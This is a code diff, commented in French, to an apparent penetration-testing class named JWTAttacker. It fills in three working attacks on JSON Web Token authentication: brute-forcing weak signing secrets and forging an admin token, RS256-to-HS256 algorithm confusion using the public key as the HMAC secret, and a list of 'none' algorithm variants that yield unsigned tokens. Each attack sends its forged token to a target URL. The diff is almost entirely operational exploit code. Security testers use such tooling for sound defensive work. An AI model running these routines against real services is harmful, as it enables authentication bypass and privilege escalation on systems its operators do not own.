@@ -9,6 +9,8 @@ import jwt
 import base64
 import json
 import httpx
+import hmac
+import hashlib
 from typing import List, Dict, Any, Optional
 
 
@@ -105,10 +107,94 @@ class JWTAttacker:
         Returns:
             Evidence avec secret_found, privilege_escalation, proof
         """
-        # TODO: boucler sur COMMON_WEAK_SECRETS + custom_secrets
-        # TODO: jwt.decode(token, secret, algorithms=[...]) dans try/except
-        # TODO: si secret trouvé → forger un token admin et tester
-        raise NotImplementedError("attack_weak_secret — à implémenter")
+        evidence = {
+            "attack_type": "JWT_WEAK_SECRET",
+            "vulnerability_confirmed": False,
+            "secret_found": None,
+            "privilege_escalation": False,
+            "proof": []
+        }
+
+        if custom_secrets is None:
+            custom_secrets = []
+
+        all_secrets = COMMON_WEAK_SECRETS + custom_secrets
+
+        try:
+            # Extraire l'algorithme du header original
+            parts = token.split('.')
+            if len(parts) < 2:
+                evidence["proof"].append("Invalid JWT format")
+                return evidence
+
+            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
+            original_alg = header.get('alg', 'HS256')
+
+            # Boucler sur COMMON_WEAK_SECRETS + custom_secrets
+            for secret in all_secrets:
+                try:
+                    # jwt.decode(token, secret, algorithms=[...]) dans try/except
+                    decoded = jwt.decode(
+                        token,
+                        secret,
+                        algorithms=[original_alg],
+                        options={"verify_signature": True}
+                    )
+
+                    # Secret trouvé!
+                    evidence["secret_found"] = secret
+                    evidence["proof"].append(f"Weak secret found: {secret[:10]}...")
+
+                    # Si secret trouvé → forger un token admin et tester
+                    try:
+                        # Modifier les claims pour l'escalation de privilèges
+                        new_payload = decoded.copy()
+                        new_payload["role"] = "admin"
+                        new_payload["admin"] = True
+
+                        # Re-signer avec le secret trouvé
+                        forged_token = jwt.encode(
+                            new_payload,
+                            secret,
+                            algorithm=original_alg
+                        )
+
+                        # Tester le token forgé
+                        async with httpx.AsyncClient() as client:
+                            test_response = await client.get(
+                                target_url,
+                                headers={"Authorization": f"Bearer {forged_token}"},
+                                timeout=10.0
+                            )
+
+                            if test_response.status_code == 200:
+                                evidence["privilege_escalation"] = True
+                                evidence["vulnerability_confirmed"] = True
+                                evidence["proof"].append(
+                                    f"Privilege escalation successful! Status: {test_response.status_code}"
+                                )
+                            else:
+                                evidence["proof"].append(
+                                    f"Token forged but server rejected: {test_response.status_code}"
+                                )
+
+                    except Exception as forge_error:
+                        evidence["proof"].append(f"Token forgery failed: {str(forge_error)}")
+
+                    # Si on a trouvé un secret, on peut s'arrêter
+                    break
+
+                except jwt.InvalidTokenError:
+                    # Secret incorrect, continuer avec le suivant
+                    continue
+                except Exception as e:
+                    evidence["proof"].append(f"Error testing secret {secret[:10]}...: {str(e)}")
+                    continue
+
+        except Exception as e:
+            evidence["proof"].append(f"Attack failed: {str(e)}")
+
+        return evidence
 
     async def attack_algorithm_confusion(
         self,
@@ -123,9 +209,84 @@ class JWTAttacker:
         Returns:
             Evidence avec attack_successful
         """
-        # TODO: re-signer le token avec la clé publique comme secret HS256
-        # TODO: envoyer et vérifier la réponse
-        raise NotImplementedError("attack_algorithm_confusion — à implémenter")
+        evidence = {
+            "attack_type": "JWT_ALGORITHM_CONFUSION",
+            "vulnerability_confirmed": False,
+            "attack_successful": False,
+            "proof": []
+        }
+
+        try:
+            # Extraire le payload original
+            parts = token.split('.')
+            if len(parts) < 2:
+                evidence["proof"].append("Invalid JWT format")
+                return evidence
+
+            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
+
+            # Vérifier si l'algorithme original est RS256
+            original_alg = header.get('alg', '')
+            if 'RS' not in original_alg.upper():
+                evidence["proof"].append(f"Original algorithm is {original_alg}, not RSA-based")
+                return evidence
+
+            # Re-signer le token avec la clé publique comme secret HS256
+            try:
+                # Modifier le header pour utiliser HS256
+                new_header = header.copy()
+                new_header['alg'] = 'HS256'
+
+                # Encoder le nouveau header
+                new_header_b64 = base64.urlsafe_b64encode(
+                    json.dumps(new_header).encode()
+                ).decode().rstrip('=')
+
+                # Encoder le payload (inchangé)
+                payload_b64 = base64.urlsafe_b64encode(
+                    json.dumps(payload).encode()
+                ).decode().rstrip('=')
+
+                # Créer la signature avec la clé publique comme secret HMAC
+                message = f"{new_header_b64}.{payload_b64}"
+                signature = hmac.new(
+                    public_key.encode(),
+                    message.encode(),
+                    hashlib.sha256
+                ).digest()
+
+                signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
+
+                # Construire le token forgé
+                forged_token = f"{message}.{signature_b64}"
+
+                # Envoyer et vérifier la réponse
+                async with httpx.AsyncClient() as client:
+                    test_response = await client.get(
+                        target_url,
+                        headers={"Authorization": f"Bearer {forged_token}"},
+                        timeout=10.0
+                    )
+
+                    if test_response.status_code == 200:
+                        evidence["attack_successful"] = True
+                        evidence["vulnerability_confirmed"] = True
+                        evidence["proof"].append(
+                            f"Algorithm confusion successful! Server accepted HS256 token with RSA public key as secret. Status: {test_response.status_code}"
+                        )
+                    else:
+                        evidence["proof"].append(
+                            f"Algorithm confusion failed. Server rejected token: {test_response.status_code}"
+                        )
+
+            except Exception as forge_error:
+                evidence["proof"].append(f"Token forgery failed: {str(forge_error)}")
+
+        except Exception as e:
+            evidence["proof"].append(f"Attack failed: {str(e)}")
+
+        return evidence
 
     async def attack_none_variants(
         self,
@@ -139,6 +300,78 @@ class JWTAttacker:
         Returns:
             Evidence avec la variante qui fonctionne si trouvée
         """
-        # TODO: générer les variantes : none, None, NONE, nOnE, NoNe, ...
-        # TODO: tester chacune
-        raise NotImplementedError("attack_none_variants — à implémenter")
+        evidence = {
+            "attack_type": "JWT_NONE_VARIANTS",
+            "vulnerability_confirmed": False,
+            "successful_variant": None,
+            "proof": []
+        }
+
+        try:
+            # Extraire le payload original
+            parts = token.split('.')
+            if len(parts) < 2:
+                evidence["proof"].append("Invalid JWT format")
+                return evidence
+
+            original_header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
+
+            # Générer les variantes : none, None, NONE, nOnE, NoNe, ...
+            none_variants = [
+                "none", "None", "NONE", "nOnE", "NoNe", "NOne", "nonE",
+                "nOne", "NoNE", "nONe", "nONE", "NoNe", "n0ne", "None",
+                "NONE", "n0nE", "N0ne", "N0NE"
+            ]
+
+            # Tester chacune
+            for variant in none_variants:
+                try:
+                    # Créer un nouveau header avec la variante de 'none'
+                    new_header = original_header.copy()
+                    new_header['alg'] = variant
+
+                    # Encoder le nouveau header
+                    new_header_b64 = base64.urlsafe_b64encode(
+                        json.dumps(new_header).encode()
+                    ).decode().rstrip('=')
+
+                    # Encoder le payload (inchangé)
+                    payload_b64 = base64.urlsafe_b64encode(
+                        json.dumps(payload).encode()
+                    ).decode().rstrip('=')
+
+                    # Créer le token sans signature (empty string)
+                    forged_token = f"{new_header_b64}.{payload_b64}."
+
+                    # Tester cette variante
+                    async with httpx.AsyncClient() as client:
+                        test_response = await client.get(
+                            target_url,
+                            headers={"Authorization": f"Bearer {forged_token}"},
+                            timeout=10.0
+                        )
+
+                        if test_response.status_code == 200:
+                            evidence["successful_variant"] = variant
+                            evidence["vulnerability_confirmed"] = True
+                            evidence["proof"].append(
+                                f"Variant '{variant}' worked! Server accepted unsigned token. Status: {test_response.status_code}"
+                            )
+                            # On a trouvé une variante qui fonctionne, on peut s'arrêter
+                            break
+                        else:
+                            evidence["proof"].append(
+                                f"Variant '{variant}' failed: {test_response.status_code}"
+                            )
+
+                except Exception as variant_error:
+                    evidence["proof"].append(
+                        f"Error testing variant '{variant}': {str(variant_error)}"
+                    )
+                    continue
+
+        except Exception as e:
+            evidence["proof"].append(f"Attack failed: {str(e)}")
+
+        return evidence
